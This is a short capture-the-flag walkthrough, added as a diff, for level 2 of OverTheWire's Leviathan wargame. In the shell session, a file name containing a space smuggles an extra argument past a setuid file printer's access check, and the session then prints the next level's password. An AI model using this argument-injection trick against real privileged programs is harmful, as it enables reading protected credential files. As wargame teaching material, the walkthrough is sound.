@@ -1,0 +1,16 @@
+Video Solution: https://youtu.be/G5bhfEVz2cc
+Task on OverTheWire: http://overthewire.org/wargames/leviathan
+
+leviathan2@leviathan:~$ ls
+printfile
+leviathan2@leviathan:~$ ./printfile 
+*** File Printer ***
+Usage: ./printfile filename
+leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan3
+You cant have that file...
+leviathan2@leviathan:~$ cd /etc/leviathan_pass/
+leviathan2@leviathan:/etc/leviathan_pass$ touch "/tmp/foo leviathan3"
+leviathan2@leviathan:/etc/leviathan_pass$ ~/printfile "/tmp/foo leviathan3"
+/bin/cat: /tmp/foo: Is a directory
+Ahdiemoo1j
+leviathan2@leviathan:/etc/leviathan_pass$ ssh leviathan3@localhost
